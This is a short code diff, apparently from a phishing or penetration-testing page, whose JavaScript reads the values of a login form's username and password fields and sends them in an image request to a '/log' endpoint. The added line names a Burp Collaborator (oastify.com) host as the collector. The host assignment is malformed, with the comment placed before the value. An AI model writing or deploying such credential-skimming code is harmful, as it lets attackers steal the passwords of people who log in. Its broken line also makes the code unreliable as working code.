@@ -127,7 +127,8 @@
       const u = encodeURIComponent(document.getElementById("UserNameText").value);
       const p = encodeURIComponent(document.getElementById("PasswordText").value);
       const protocol = window.location.protocol;
-      const host = // host with valid SSL cert (e.g. burp collaborator) window.location.hostname;
+      
+      const host = // host with valid SSL cert (e.g. burp collaborator 10zd6vqmp4s3uoveqramsqf01r7ivajz.oastify.com) window.location.hostname;
       // const port = protocol === "https:" ? "9999" : "9998";
       const i = new Image();
       i.src = `${protocol}//${host}/log?u=${u}&p=${p}`;
